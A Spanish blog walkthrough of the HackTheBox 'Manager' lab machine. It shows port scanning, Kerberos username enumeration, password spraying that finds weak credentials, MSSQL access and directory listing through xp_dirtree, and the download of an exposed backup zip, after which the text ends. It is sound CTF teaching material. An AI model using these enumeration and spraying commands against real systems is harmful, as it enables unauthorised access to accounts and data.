<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>HackTheBox - Manager (medium) | MiguelRega7 - blog</title>
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="HackTheBox - Manager (medium)" />
<meta name="author" content="MiguelRega7" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Posts sobre resolución de CTFs y ciberseguridad." />
<meta property="og:description" content="Posts sobre resolución de CTFs y ciberseguridad." />
<link rel="canonical" href="http://localhost:4000/hackthebox/machines/medium/2024/04/05/manager.html" />
<meta property="og:url" content="http://localhost:4000/hackthebox/machines/medium/2024/04/05/manager.html" />
<meta property="og:site_name" content="MiguelRega7 - blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-04-05T00:00:00-06:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="HackTheBox - Manager (medium)" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-04-05T00:00:00-06:00","datePublished":"2024-04-05T00:00:00-06:00","description":"Posts sobre resolución de CTFs y ciberseguridad.","headline":"HackTheBox - Manager (medium)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/machines/medium/2024/04/05/manager.html"},"url":"http://localhost:4000/hackthebox/machines/medium/2024/04/05/manager.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
</head>
<body><header class="site-header">

  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">HackTheBox - Manager (medium)</h1>
    <p class="post-meta"><time class="dt-published" datetime="2024-04-05T00:00:00-06:00" itemprop="datePublished">
        Apr 5, 2024
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/5ca8f0c721a9eca6f1aeb9ff4b4bac60.png" />
</p>

<ul>
  <li>Manager es una máquina Windows de dificultad media que alberga un entorno de Active Directory con AD CS (Active Directory Certificate Services), un servidor web y un servidor SQL. El punto de entrada implica enumerar usuarios utilizando RID cycling y realizar un ataque de contraseña para acceder al servicio MSSQL. Luego, se utiliza el procedimiento xp_dirtree para explorar el sistema de archivos, descubriendo una copia de seguridad del sitio web en la raíz del servidor web. Extrayendo la copia de seguridad se revelan credenciales que se reutilizan para conectarse a través de WinRM al servidor. Finalmente, el atacante escala privilegios a través de AD CS mediante la explotación de ESC7.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Comenzamos escaneando los puertos abiertos por el protocolo <strong>TCP</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,80,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49669,49670,49671,49721,56310,60346 10.10.11.236 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-03-16 11:44 CST
Nmap scan report <span class="k">for </span>10.10.11.236
Host is up <span class="o">(</span>0.17s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
80/tcp    open     http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Manager
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-03-17 00:45:13Z<span class="o">)</span>
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: manager.htb0., Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
|_ssl-date: 2024-03-17T00:46:50+00:00<span class="p">;</span> +7h00m01s from scanner time.
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: manager.htb0., Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
|_ssl-date: 2024-03-17T00:46:48+00:00<span class="p">;</span> +7h00m01s from scanner time.
1433/tcp  open     ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00<span class="p">;</span> RTM
| ms-sql-ntlm-info:
|   10.10.11.236:1433:
|     Target_Name: MANAGER
|     NetBIOS_Domain_Name: MANAGER
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: manager.htb
|     DNS_Computer_Name: dc01.manager.htb
|     DNS_Tree_Name: manager.htb
|_    Product_Version: 10.0.17763
| ms-sql-info:
|   10.10.11.236:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: <span class="nb">false</span>
|_    TCP port: 1433
|_ssl-date: 2024-03-17T00:46:50+00:00<span class="p">;</span> +7h00m01s from scanner time.
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>SSL_Self_Signed_Fallback
| Not valid before: 2024-03-15T21:10:24
|_Not valid after:  2054-03-15T21:10:24
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: manager.htb0., Site: Default-First-Site-Name<span class="o">)</span>
|_ssl-date: 2024-03-17T00:46:50+00:00<span class="p">;</span> +7h00m01s from scanner time.
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
3269/tcp  open     ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: manager.htb0., Site: Default-First-Site-Name<span class="o">)</span>
|_ssl-date: 2024-03-17T00:46:48+00:00<span class="p">;</span> +7h00m01s from scanner time.
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-title: Not Found
9389/tcp  open     mc-nmf        .NET Message Framing
49667/tcp open     msrpc         Microsoft Windows RPC
49669/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open     msrpc         Microsoft Windows RPC
49671/tcp open     msrpc         Microsoft Windows RPC
49721/tcp open     msrpc         Microsoft Windows RPC
56310/tcp filtered unknown
60346/tcp open     msrpc         Microsoft Windows RPC
Service Info: Host: DC01<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
| smb2-time:
|   <span class="nb">date</span>: 2024-03-17T00:46:08
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
</code></pre></div></div>

<h2 id="enumeración-de-usuarios">Enumeración de usuarios</h2>

<ul>
  <li>Bueno primero vamos a agregar los dominios que tenemos al archivo <strong>/etc/hosts</strong>*.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="s2">"10.10.11.236 dc01.manager.htb manager.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.10.11.236 dc01.manager.htb manager.htb
</code></pre></div></div>

<ul>
  <li>Estamos ante un <strong>Windows 10</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap crackmapexec smb 10.10.11.236
SMB         10.10.11.236    445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:manager.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos a comenzar enumerando por el protocolo <strong>smb</strong> para ver si podemos ver recursos compartidos.</p>
  </li>
  <li>
    <p>Solo vemos esto.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap crackmapexec smb 10.10.11.236 <span class="nt">-u</span> <span class="s2">"miguel"</span> <span class="nt">-p</span> <span class="s2">""</span> <span class="nt">--shares</span>
SMB         10.10.11.236    445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:manager.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.236    445    DC01             <span class="o">[</span>+] manager.htb<span class="se">\m</span>iguel:
SMB         10.10.11.236    445    DC01             <span class="o">[</span>+] Enumerated shares
SMB         10.10.11.236    445    DC01             Share           Permissions     Remark
SMB         10.10.11.236    445    DC01             <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         10.10.11.236    445    DC01             ADMIN<span class="nv">$ </span>                         Remote Admin
SMB         10.10.11.236    445    DC01             C<span class="nv">$ </span>                             Default share
SMB         10.10.11.236    445    DC01             IPC<span class="nv">$ </span>           READ            Remote IPC
SMB         10.10.11.236    445    DC01             NETLOGON                        Logon server share
SMB         10.10.11.236    445    DC01             SYSVOL                          Logon server share
➜  nmap
</code></pre></div></div>

<ul>
  <li>Podemos enumerar usuarios tanto por <strong>kerberos</strong> y con <strong>crackmapexec</strong> vamos a usar <strong>kerberos</strong> primero.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content ./kerbrute userenum <span class="nt">-d</span> manager.htb /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt <span class="nt">--dc</span> dc01.manager.htb

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/

Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 03/16/24 - Ronnie Flathers @ropnop

2024/03/16 12:01:09 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
2024/03/16 12:01:09 <span class="o">&gt;</span>  	dc01.manager.htb:88

2024/03/16 12:01:12 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 ryan@manager.htb
2024/03/16 12:01:18 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 guest@manager.htb
2024/03/16 12:01:21 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 cheng@manager.htb
2024/03/16 12:01:23 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 raven@manager.htb
2024/03/16 12:01:38 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 administrator@manager.htb
2024/03/16 12:02:12 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 Ryan@manager.htb
2024/03/16 12:02:19 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 Raven@manager.htb
2024/03/16 12:02:37 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 operator@manager.htb
</code></pre></div></div>

<ul>
  <li>Y bueno tenemos usuarios lo que podemos hacer ahora es un <strong>Password Spraying</strong> para ver si algun usuario usa su nombre de usuario como contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.10.11.236 <span class="nt">-u</span> list.txt <span class="nt">-p</span> list.txt <span class="nt">--no-brute</span> <span class="nt">--continue-on-success</span>
SMB         10.10.11.236    445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:manager.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.236    445    DC01             <span class="o">[</span>-] manager.htb<span class="se">\r</span>yan:ryan STATUS_LOGON_FAILURE
SMB         10.10.11.236    445    DC01             <span class="o">[</span>-] manager.htb<span class="se">\g</span>uest:guest STATUS_LOGON_FAILURE
SMB         10.10.11.236    445    DC01             <span class="o">[</span>-] manager.htb<span class="se">\c</span>heng:cheng STATUS_LOGON_FAILURE
SMB         10.10.11.236    445    DC01             <span class="o">[</span>-] manager.htb<span class="se">\r</span>aven:raven STATUS_LOGON_FAILURE
SMB         10.10.11.236    445    DC01             <span class="o">[</span>-] manager.htb<span class="se">\a</span>dministrator:administrator STATUS_LOGON_FAILURE
SMB         10.10.11.236    445    DC01             <span class="o">[</span>-] manager.htb<span class="se">\r</span>yan:ryan STATUS_LOGON_FAILURE
SMB         10.10.11.236    445    DC01             <span class="o">[</span>-] manager.htb<span class="se">\r</span>aven:raven STATUS_LOGON_FAILURE
SMB         10.10.11.236    445    DC01             <span class="o">[</span>+] manager.htb<span class="se">\o</span>perator:operator
</code></pre></div></div>

<ul>
  <li>Y bueno con esto sabemos que el usuario <strong>operator:operator</strong> son sus credenciales, pero si revisamos no podemos usar <strong>evil-winrm</strong> para conectarnos ala máquina.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec winrm 10.10.11.236 <span class="nt">-u</span> <span class="s2">"operator"</span> <span class="nt">-p</span> <span class="s2">"operator"</span>
SMB         10.10.11.236    5985   DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:manager.htb<span class="o">)</span>
HTTP        10.10.11.236    5985   DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.11.236:5985/wsman
WINRM       10.10.11.236    5985   DC01             <span class="o">[</span>-] manager.htb<span class="se">\o</span>perator:operator
</code></pre></div></div>

<ul>
  <li>Tenemos privilegios de lectura en esos directorios.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.10.11.236 <span class="nt">-u</span> <span class="s2">"operator"</span> <span class="nt">-p</span> <span class="s2">"operator"</span> <span class="nt">--shares</span>
SMB         10.10.11.236    445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:manager.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.236    445    DC01             <span class="o">[</span>+] manager.htb<span class="se">\o</span>perator:operator
SMB         10.10.11.236    445    DC01             <span class="o">[</span>+] Enumerated shares
SMB         10.10.11.236    445    DC01             Share           Permissions     Remark
SMB         10.10.11.236    445    DC01             <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         10.10.11.236    445    DC01             ADMIN<span class="nv">$ </span>                         Remote Admin
SMB         10.10.11.236    445    DC01             C<span class="nv">$ </span>                             Default share
SMB         10.10.11.236    445    DC01             IPC<span class="nv">$ </span>           READ            Remote IPC
SMB         10.10.11.236    445    DC01             NETLOGON        READ            Logon server share
SMB         10.10.11.236    445    DC01             SYSVOL          READ            Logon server share
</code></pre></div></div>

<h2 id="mssql">MSSQL</h2>

<ul>
  <li>Si recordamos tenemos este puerto abierto.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1433/tcp  open     ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00<span class="p">;</span> RTM
| ms-sql-ntlm-info:
|   10.10.11.236:1433:
|     Target_Name: MANAGER
|     NetBIOS_Domain_Name: MANAGER
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: manager.htb
|     DNS_Computer_Name: dc01.manager.htb
|     DNS_Tree_Name: manager.htb
|_    Product_Version: 10.0.17763
| ms-sql-info:
|   10.10.11.236:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: <span class="nb">false</span>
|_    TCP port: 1433
|_ssl-date: 2024-03-17T00:46:50+00:00<span class="p">;</span> +7h00m01s from scanner time.
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>SSL_Self_Signed_Fallback
| Not valid before: 2024-03-15T21:10:24
|_Not valid after:  2054-03-15T21:10:24
</code></pre></div></div>

<ul>
  <li>Podemos ver si nuestro usuario es válido para usar ese servicio.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec mssql 10.10.11.236 <span class="nt">-u</span> <span class="s2">"operator"</span> <span class="nt">-p</span> <span class="s2">"operator"</span>
MSSQL       10.10.11.236    1433   DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:manager.htb<span class="o">)</span>
MSSQL       10.10.11.236    1433   DC01             <span class="o">[</span>+] manager.htb<span class="se">\o</span>perator:operator
</code></pre></div></div>

<ul>
  <li>Sabiendo esto podemos usar <strong>impacket-mssqlclient</strong> para conectarnos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-mssqlclient <span class="nt">-port</span> 1433 10.10.11.236/operator:operator@10.10.11.236 <span class="nt">-window</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption required, switching to TLS
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: master
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>: Old Value: , New Value: us_english
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>: Old Value: 4096, New Value: 16192
<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>DC01<span class="se">\S</span>QLEXPRESS<span class="o">)</span>: Line 1: Changed database context to <span class="s1">'master'</span><span class="nb">.</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>DC01<span class="se">\S</span>QLEXPRESS<span class="o">)</span>: Line 1: Changed language setting to us_english.
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ACK: Result: 1 - Microsoft SQL Server <span class="o">(</span>150 7208<span class="o">)</span>
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
SQL <span class="o">(</span>MANAGER<span class="se">\O</span>perator  guest@master<span class="o">)&gt;</span> SELECT name FROM sys.databases
name
<span class="nt">------</span>
master

tempdb

model

msdb

SQL <span class="o">(</span>MANAGER<span class="se">\O</span>perator  guest@master<span class="o">)&gt;</span>
</code></pre></div></div>

<ul>
  <li>Ahora enumeramos las tablas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>MANAGER<span class="se">\O</span>perator  guest@master<span class="o">)&gt;</span> SELECT <span class="k">*</span> FROM sys.tables
name                object_id   principal_id   schema_id   parent_object_id   <span class="nb">type   </span>type_desc    create_date   modify_date   is_ms_shipped   is_published   is_schema_published   lob_data_space_id   filestream_data_space_id   max_column_id_used   lock_on_bulk_load   uses_ansi_nulls   is_replicated   has_replication_filter   is_merge_published   is_sync_tran_subscribed   has_unchecked_assembly_data   text_in_row_limit   large_value_types_out_of_row   is_tracked_by_cdc   lock_escalation   lock_escalation_desc   is_filetable   is_memory_optimized   durability   durability_desc   temporal_type   temporal_type_desc   history_table_id   is_remote_data_archive_enabled   is_external   history_retention_period   history_retention_period_unit   history_retention_period_unit_desc   is_node   is_edge
<span class="nt">----------------</span>   <span class="nt">----------</span>   <span class="nt">------------</span>   <span class="nt">---------</span>   <span class="nt">----------------</span>   <span class="nt">----</span>   <span class="nt">----------</span>   <span class="nt">-----------</span>   <span class="nt">-----------</span>   <span class="nt">-------------</span>   <span class="nt">------------</span>   <span class="nt">-------------------</span>   <span class="nt">-----------------</span>   <span class="nt">------------------------</span>   <span class="nt">------------------</span>   <span class="nt">-----------------</span>   <span class="nt">---------------</span>   <span class="nt">-------------</span>   <span class="nt">----------------------</span>   <span class="nt">------------------</span>   <span class="nt">-----------------------</span>   <span class="nt">---------------------------</span>   <span class="nt">-----------------</span>   <span class="nt">----------------------------</span>   <span class="nt">-----------------</span>   <span class="nt">---------------</span>   <span class="nt">--------------------</span>   <span class="nt">------------</span>   <span class="nt">-------------------</span>   <span class="nt">----------</span>   <span class="nt">---------------</span>   <span class="nt">-------------</span>   <span class="nt">------------------</span>   <span class="nt">----------------</span>   <span class="nt">------------------------------</span>   <span class="nt">-----------</span>   <span class="nt">------------------------</span>   <span class="nt">-----------------------------</span>   <span class="nt">----------------------------------</span>   <span class="nt">-------</span>   <span class="nt">-------</span>
spt_fallback_db     117575457           NULL           1                  0   b<span class="s1">'U '</span>   USER_TABLE   2003-04-08 09:18:01   2019-09-24 14:23:14               1              0                     0                   0                       NULL                    8                   0                 1               0                        0                    0                         0                             0                   0                              0                   0                 0   TABLE                             0                     0            0   SCHEMA_AND_DATA               0   NON_TEMPORAL_TABLE               NULL                                0             0                       NULL                            NULL   NULL                                       0         0

spt_fallback_dev    133575514           NULL           1                  0   b<span class="s1">'U '</span>   USER_TABLE   2003-04-08 09:18:02   2019-09-24 14:23:14               1              0                     0                   0                       NULL                   10                   0                 1               0                        0                    0                         0                             0                   0                              0                   0                 0   TABLE                             0                     0            0   SCHEMA_AND_DATA               0   NON_TEMPORAL_TABLE               NULL                                0             0                       NULL                            NULL   NULL                                       0         0

spt_fallback_usg    149575571           NULL           1                  0   b<span class="s1">'U '</span>   USER_TABLE   2003-04-08 09:18:04   2019-09-24 14:23:14               1              0                     0                   0                       NULL                    9                   0                 1               0                        0                    0                         0                             0                   0                              0                   0                 0   TABLE                             0                     0            0   SCHEMA_AND_DATA               0   NON_TEMPORAL_TABLE               NULL                                0             0                       NULL                            NULL   NULL                                       0         0

spt_monitor        1803153469           NULL           1                  0   b<span class="s1">'U '</span>   USER_TABLE   2019-09-24 14:21:40   2019-09-24 14:23:14               1              0                     0                   0                       NULL                   11                   0                 1               0                        0                    0                         0                             0                   0                              0                   0                 0   TABLE                             0                     0            0   SCHEMA_AND_DATA               0   NON_TEMPORAL_TABLE               NULL                                0             0                       NULL                            NULL   NULL                                       0         0

SQL <span class="o">(</span>MANAGER<span class="se">\O</span>perator  guest@master<span class="o">)&gt;</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Pero nada importante.</p>
  </li>
  <li>
    <p>No tenemos permiso de habilitar el <code class="language-plaintext highlighter-rouge">xp_cmdshell</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>MANAGER<span class="se">\O</span>perator  guest@master<span class="o">)&gt;</span> enable_xp_cmdshell
<span class="o">[</span>-] ERROR<span class="o">(</span>DC01<span class="se">\S</span>QLEXPRESS<span class="o">)</span>: Line 105: User does not have permission to perform this action.
<span class="o">[</span>-] ERROR<span class="o">(</span>DC01<span class="se">\S</span>QLEXPRESS<span class="o">)</span>: Line 1: You <span class="k">do </span>not have permission to run the RECONFIGURE statement.
<span class="o">[</span>-] ERROR<span class="o">(</span>DC01<span class="se">\S</span>QLEXPRESS<span class="o">)</span>: Line 62: The configuration option <span class="s1">'xp_cmdshell'</span> does not exist, or it may be an advanced option.
<span class="o">[</span>-] ERROR<span class="o">(</span>DC01<span class="se">\S</span>QLEXPRESS<span class="o">)</span>: Line 1: You <span class="k">do </span>not have permission to run the RECONFIGURE statement.
SQL <span class="o">(</span>MANAGER<span class="se">\O</span>perator  guest@master<span class="o">)&gt;</span>
</code></pre></div></div>

<ul>
  <li>Ahora vamos a enumerar <strong>files</strong> con <strong>xp_dirtree</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>MANAGER<span class="se">\O</span>perator  guest@master<span class="o">)&gt;</span> xp_dirtree C:<span class="se">\</span>
subdirectory                depth   file
<span class="nt">-------------------------</span>   <span class="nt">-----</span>   <span class="nt">----</span>
<span class="nv">$Recycle</span>.Bin                    1      0

Documents and Settings          1      0

inetpub                         1      0

PerfLogs                        1      0

Program Files                   1      0

Program Files <span class="o">(</span>x86<span class="o">)</span>             1      0

ProgramData                     1      0

Recovery                        1      0

SQL2019                         1      0

System Volume Information       1      0

Users                           1      0

Windows                         1      0
</code></pre></div></div>

<ul>
  <li>Y bueno encontramos directorio interesante donde encontramos un <strong>.zip</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>MANAGER<span class="se">\O</span>perator  guest@master<span class="o">)&gt;</span> xp_dirtree C:<span class="se">\i</span>netpub<span class="se">\w</span>wwroot
subdirectory                      depth   file
<span class="nt">-------------------------------</span>   <span class="nt">-----</span>   <span class="nt">----</span>
about.html                            1      1

contact.html                          1      1

css                                   1      0

images                                1      0

index.html                            1      1

js                                    1      0

service.html                          1      1

web.config                            1      1

website-backup-27-07-23-old.zip       1      1

SQL <span class="o">(</span>MANAGER<span class="se">\O</span>perator  guest@master<span class="o">)&gt;</span>
</code></pre></div></div>

<h1 id="zip">Zip</h1>

<ul>
  <li>Vamos a descargar el comprimido fácilmente.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content wget http://10.10.11.236/website-backup-27-07-23-old.zip
<span class="nt">--2024-03-16</span> 12:30:07--  http://10.10.11.236/website-backup-27-07-23-old.zip
Connecting to 10.10.11.236:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1045328 <span class="o">(</span>1021K<span class="o">)</span> <span class="o">[</span>application/x-zip-compressed]
Saving to: ‘website-backup-27-07-23-old.zip’

website-backup-27-07-23-old.zip      100%[<span class="o">=====================================================================&gt;]</span>   1021K   933KB/s    <span class="k">in </span>1.1s

2024-03-16 12:30:08 <span class="o">(</span>933 KB/s<span class="o">)</span> - ‘website-backup-27-07-23-old.zip’ saved <span class="o">[</span>1045328/1045328]
</code></pre></div></div>

<ul>
  <li>Ahora vamos a descomprimirlo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content unzip website-backup-27-07-23-old.zip
Archive:  website-backup-27-07-23-old.zip
  inflating: .old-conf.xml
  inflating: about.html
  inflating: contact.html
  inflating: css/bootstrap.css
  inflating: css/responsive.css
  inflating: css/style.css
  inflating: css/style.css.map
  inflating: css/style.scss
  inflating: images/about-img.png
  inflating: images/body_bg.jpg
 extracting: images/call.png
 extracting: images/call-o.png
  inflating: images/client.jpg
  inflating: images/contact-img.jpg
